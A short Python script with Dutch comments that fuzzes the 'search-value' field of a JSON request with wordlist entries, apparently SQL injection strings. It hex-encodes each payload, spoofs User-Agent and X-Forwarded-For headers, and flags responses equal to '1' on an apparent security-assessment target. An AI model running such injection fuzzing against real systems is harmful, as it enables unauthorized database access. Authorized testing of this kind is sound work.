import requests
import json
import binascii

def load_wordlist(wordlist_file):
    with open(wordlist_file, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Wijzig de JSON payload door de "search-value" te veranderen
def modify_json_payload(base_payload, new_value):
    payload_copy = base_payload.copy()
    payload_copy['search-value'] = new_value
    return payload_copy

# Hex encode het gehele JSON object zonder spaties
def hex_encode_json(json_payload):
    json_str = json.dumps(json_payload)
    return binascii.hexlify(json_str.encode()).decode()

def send_request(url, hex_payload):
    headers = {
        'Host': 'assessment.secura-test.com',
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
        'X-Forwarded-For': '192.168.1.1',
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Origin': 'http://assessment.secura-test.com',
        'Referer': 'http://assessment.secura-test.com/secret',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'close'
    }
    
    response = requests.post(url, data=hex_payload, headers=headers)
    return response

def main():
    url = 'http://assessment.secura-test.com/secret-robotica-panel' 
    wordlist_file = 'wordlist.txt'  # Bestand met woordenlijst voor SQL injecties of testwaarden
    base_payload = {"search-value": "t"}  # Initieel payload sjabloon waarbij 't' vervangen zal worden
    
    wordlist = load_wordlist(wordlist_file)
    
    for new_value in wordlist:
        modified_payload = modify_json_payload(base_payload, new_value)
        
        # Hex encode de gewijzigde payload
        hex_encoded_payload = hex_encode_json(modified_payload)
        
        response = send_request(url, hex_encoded_payload)

        if response.text == '1':
            print(f"Hex-gecodeerde payload: {hex_encoded_payload}")
            print(f"tekst: {response.text}") 

if __name__ == "__main__":
    main()
